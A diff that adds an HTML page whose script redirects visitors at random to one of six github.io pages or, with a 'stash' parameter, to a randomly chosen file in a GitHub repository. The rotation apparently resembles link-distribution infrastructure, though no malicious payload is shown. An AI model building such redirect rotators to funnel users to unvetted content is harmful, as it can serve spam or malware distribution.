@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Random Redirect</title>
+
+<script>
+(() => {
+    const defaultRedirect = () => {
+        // Randomly choose a number from 1 to 6 (inclusive)
+        const version = Math.floor(Math.random() * 6) + 1;
+
+        // Redirect
+        window.location.replace(
+            `http://needacounto.github.io/img9/allv${version}.html`
+        );
+    };
+
+    // Optional param: ?stash=stash2
+    const stashName = new URLSearchParams(window.location.search).get("stash");
+
+    if (!stashName) {
+        defaultRedirect();
+        return;
+    }
+
+    Promise.all([
+        fetch("all.json").then(res => res.json()),
+        fetch("files.json").then(res => res.json())
+    ])
+        .then(([data, files]) => {
+            const repos = data.repositories || data;
+            const repo = repos[stashName];
+
+            if (!repo) throw new Error("Stash not found");
+
+            const start = Number(repo.issueStartNumber);
+            const end = Number(repo.issueEndNumber);
+
+            // Random issue number from start to end (inclusive)
+            const issue = Math.floor(Math.random() * (end - start + 1)) + start;
+
+            // Files belonging to this stash, in files.json order
+            const stashFiles = files.filter(f => f.startsWith(stashName + "/"));
+
+            // Issue number n maps to the nth file of the stash
+            const path = stashFiles[issue - 1];
+
+            if (!path) throw new Error("File not found for issue " + issue);
+
+            const fileName = path.slice(stashName.length + 1);
+
+            window.location.replace(
+                `https://github.com/${repo.username}/img9/blob/in7/files/${stashName}/${encodeURIComponent(fileName)}`
+            );
+        })
+        .catch(defaultRedirect); // fall back to the original behavior
+})();
+</script>
+
+<noscript>
+<meta http-equiv="refresh" content="0;url=http://needacounto.github.io/img9/allv1.html">
+</noscript>
+
+</head>
+<body>
+Redirecting...
+</body>
+</html>
